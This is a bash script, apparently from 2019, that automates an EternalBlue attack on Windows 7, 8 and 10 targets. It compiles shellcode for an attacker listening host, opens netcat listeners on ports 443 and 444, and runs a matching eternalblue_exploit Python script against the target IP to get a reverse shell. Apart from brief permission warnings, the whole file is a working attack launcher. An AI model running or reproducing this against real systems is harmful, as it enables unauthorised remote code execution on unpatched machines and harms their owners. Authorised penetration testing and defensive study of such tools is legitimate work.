#!/bin/bash
# This will semi-automate the process from compiling shellcodes up to attacking a target
# derco0n - 2019/12
if [ -z "$1" ]
  then
    echo "No Host given."
    echo "Usage: $0 <Target-IP> <LHOST-IP> [TargetID]"
    echo "Example: $0 192.168.74.10 192.168.74.20 0"
    exit 1
fi
echo "Starting semi-automatic mode."
echo "Dont' use this against a machine if you don't have explicit permission."
echo "Use at your own risk. You have been warned."
echo "Press Crtl+C to abort"
sleep 5
if [ -z "$3" ]; then
	# No target defined
	echo "Please choose a target from the list:"
	echo "#####################################"
	echo "0: Windows 7 (and probably Server)"
	echo "1: Windows 8(.1) (and probably Server)"
	echo "2: Windows 10 (and probably Server)"
	read target
else
	target=$3
fi
if ! [[ "$target" =~ ^[0-2]+$ ]]; then
	echo "Invalid target ($target). Aborting !"
	exit 5
fi
if [[ "$target" -eq 0 ]]; then
	win=7
elif [[ "$target" -eq 1 ]]; then
	win=8
else
	win=10
fi
echo "Target is Windows $win"

echo "Calling: /bin/bash $(pwd)/shellcode/shell_prep.sh"
/bin/bash ./shell_prep.sh auto $2

if test -f "./sc_all.bin"; then
	echo "Preparing nc-listeners in new gnome-terminals..."
	# This will only work under gnome/unity GUI-environments
	gnome-terminal -q -- /usr/bin/nc -vlp 443
	gnome-terminal -q -- /usr/bin/nc -vlp 444
	echo "Done."
	echo "Calling: /usr/bin/python2.7 $(pwd)/eternalblue_exploit$win.py"
	/usr/bin/python2.7 ../eternalblue_exploit$win.py $1 ./sc_all.bin
else
	echo "Error. Shellcode-file \"./sc_all.bin\" not found. Aborting!"
	exit 4
fi

echo "All done. If you are lucky, you should have a reverse-shell by now."
echo "If not. Try rerunning the script as the exploit might not always run successfully."
echo ""
echo "Don't be evil."
echo ""
exit 0
